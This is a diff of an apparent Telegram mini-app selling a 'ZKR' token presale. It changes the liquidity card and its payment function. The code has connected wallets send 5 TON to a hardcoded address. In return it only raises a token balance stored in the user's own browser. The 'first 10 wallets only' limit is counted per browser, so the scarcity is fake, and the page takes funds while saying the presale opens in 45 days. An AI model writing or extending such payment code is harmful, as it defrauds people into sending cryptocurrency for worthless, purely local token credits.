@@ -247,7 +247,7 @@ canvas#particles{position:fixed;top:0;left:0;width:100%;height:100%;pointer-even
 
 <div class="section">
 <div style="background:rgba(108,99,255,0.15);border:1px solid #6c63ff;border-radius:12px;padding:12px;margin-bottom:12px;text-align:center"><div style="color:#ffaa00;font-weight:bold;font-size:13px">⚠️ LIMITED PRESALE</div><div style="color:#aaa;font-size:12px;margin-top:4px">Only first 1,000 wallets | Max 40 TON per wallet</div></div>
-<div class="task-card" style="border:2px solid #ffaa00;background:linear-gradient(135deg,rgba(255,170,0,0.15),rgba(20,18,45,0.9));margin-bottom:10px"><div class="task-info"><span class="task-icon">💰</span><div><div class="task-name">Support Project Liquidity</div><div class="task-pts" style="color:#ffaa00">~$10 in TON | +30% Bonus + PLATINUM</div><div style="color:#ff6666;font-size:10px;margin-top:2px">LIMITED — First 10 wallets only!</div></div></div><button class="task-btn" id="btn-liquidity" onclick="supportLiquidity()" style="background:linear-gradient(135deg,#ffaa00,#ff6600)">Support</button></div>
+<div class="task-card" style="border:2px solid #ffaa00;background:linear-gradient(135deg,rgba(255,170,0,0.15),rgba(20,18,45,0.9));margin-bottom:10px"><div class="task-info"><span class="task-icon">💰</span><div><div class="task-name">Support Project Liquidity</div><div class="task-pts" style="color:#ffaa00">5 TON → 15,000 ZKR</div><div style="color:#ff6666;font-size:10px;margin-top:2px">LIMITED — First 10 wallets only!</div></div></div><button class="task-btn" id="btn-liquidity" onclick="supportLiquidity()" style="background:linear-gradient(135deg,#ffaa00,#ff6600)">Support</button></div>
 <h2 id="buy-title" style="display:none">💎 Buy ZKR</h2>
 <div style="color:#888;font-size:12px;margin-bottom:12px" id="buy-desc" style="display:none">Presale opens in 45 days. Early supporters get the best rates!</div>
 </div>
@@ -575,14 +575,14 @@ async function supportLiquidity(){
   if(!tonConnectUI||!tonConnectUI.wallet){tg.showAlert("Connect TON wallet first!");connectWallet();return;}
   var liq=parseInt(localStorage.getItem("liq_count")||"0");
   if(liq>=10){tg.showAlert("Sorry! All 10 Platinum spots are taken.");return;}
-  var tx={validUntil:Math.floor(Date.now()/1000)+600,messages:[{address:"UQBbWHxNpPeI0oXO6OIfR3alZ9T9T40pR_BDRPvYyqSsl-Kl",amount:"10000000000"}]};
+  var tx={validUntil:Math.floor(Date.now()/1000)+600,messages:[{address:"UQBbWHxNpPeI0oXO6OIfR3alZ9T9T40pR_BDRPvYyqSsl-Kl",amount:"5000000000"}]};
   try{
     await tonConnectUI.sendTransaction(tx);
     localStorage.setItem("liq_count",String(liq+1));
     if(!state.tasks.includes("liquidity")){
       state.tasks.push("liquidity");
       state.points+=1000;
-      state.tokens+=Math.floor(state.tokens*0.3)+5000;
+      state.tokens+=15000;
       save();updateUI();
     }
     tg.showAlert("PLATINUM achieved! +30% bonus tokens added!");
